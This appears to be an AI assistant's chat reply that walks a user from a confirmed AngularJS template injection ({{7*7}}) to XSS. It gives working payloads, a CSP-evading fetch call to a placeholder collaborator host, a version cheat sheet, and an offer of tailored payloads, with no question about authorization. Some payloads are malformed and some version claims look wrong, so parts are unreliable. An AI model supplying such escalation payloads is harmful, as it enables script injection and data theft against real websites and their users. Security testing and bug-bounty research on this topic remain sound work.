
# 🚨 AngularJS Template Injection → XSS Path

🔥 **Ohhh snap!** If `{{7*7}}` gave you `49`, you’ve just confirmed that **AngularJS template injection** is **possible** on the page — and that’s a *golden entry point* for XSS 💉💥

---

## ✅ What just happened?

You typed:

```
{{7*7}}
```

And it rendered:

```
49
```

➡ That means **AngularJS expression evaluation is active in the context** — and user input is being evaluated inside an AngularJS `{{ expression }}` block. That’s a sign of **AngularJS-based XSS vulnerability** 🧠💡

---

## 🚀 What to do next (Path to XSS)

You need to **escalate this template injection into JavaScript execution**.

Here’s a step-by-step:

---

### 🧪 Step 1: Confirm injection

Try:

```html
{{constructor.constructor('alert(1)')()}}
```

If this works, it will pop an alert — 🎯 **XSS confirmed.**

---

### 🛡️ Step 2: Bypass CSP (if it blocks `alert`)

If there’s Content Security Policy (CSP), `alert()` may be blocked. In that case, try something stealthier:

```html
{{constructor.constructor('fetch("https://your.burpcollaborator.net")() }}
```

➡ Replace it with your [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [webhook.site](https://webhook.site) URL to detect exfiltration.

---

### 🧠 Bonus: Know your AngularJS version!

Some payloads work **only in specific versions**. Try fingerprinting it in the console:

```js
angular.version.full
```

Or inject this:

```html
{{constructor.constructor('return angular.version.full')()}}
```

---

## 🛠️ Payloads Cheat Sheet

| AngularJS Version | Payload |
|-------------------|---------|
| `< 1.6.x`         | `{{constructor.constructor('alert(1)')()}}` |
| `1.2.x`           | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}` |

---

💣 Wanna tell me the AngularJS version or share the vulnerable input field context? I can give you **tailored payloads** and help you craft a **report-worthy XSS** 🔥
